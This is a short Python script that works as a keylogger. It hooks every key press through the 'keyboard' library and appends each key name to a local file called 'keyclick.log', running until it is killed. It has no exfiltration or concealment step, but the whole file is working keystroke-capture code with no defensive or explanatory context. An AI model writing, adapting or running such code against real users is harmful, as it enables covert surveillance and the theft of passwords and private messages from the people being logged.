import keyboard
log_details = "keyclick.log"

def onkeypress(event):
	with open(log_details, "a") as fi:
		fi.write(event.name)

keyboard.on_press(onkeypress)

keyboard.wait() 
